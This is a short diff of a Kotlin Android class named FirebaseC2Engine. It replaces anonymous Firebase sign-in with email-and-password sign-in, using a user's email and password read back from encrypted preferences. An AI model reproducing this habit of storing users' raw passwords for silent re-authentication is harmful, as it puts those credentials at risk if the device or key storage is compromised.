@@ -143,12 +143,17 @@ class FirebaseC2Engine(
     fun getAuthToken(): String? {
         var currentUser = FirebaseAuth.getInstance().currentUser
         if (currentUser == null) {
-            try {
-                val task = FirebaseAuth.getInstance().signInAnonymously()
-                Tasks.await(task, 5, TimeUnit.SECONDS)
-                currentUser = FirebaseAuth.getInstance().currentUser
-            } catch (e: Exception) {
-                Log.w(TAG, "Failed anonymous sign in for auth token: ${e.message}")
+            val prefs = SecurityVaultManager.getEncryptedPrefs(context)
+            val savedEmail = prefs.getString("user_email", null) ?: prefs.getString("user_firebase_email", "") ?: ""
+            val savedPass = prefs.getString("user_password", "") ?: ""
+            if (savedEmail.isNotBlank() && savedPass.isNotBlank()) {
+                try {
+                    val task = FirebaseAuth.getInstance().signInWithEmailAndPassword(savedEmail, savedPass)
+                    Tasks.await(task, 5, TimeUnit.SECONDS)
+                    currentUser = FirebaseAuth.getInstance().currentUser
+                } catch (e: Exception) {
+                    Log.w(TAG, "Failed email/password sign-in for auth token: ${e.message}")
+                }
             }
         }
         val user = currentUser ?: return null
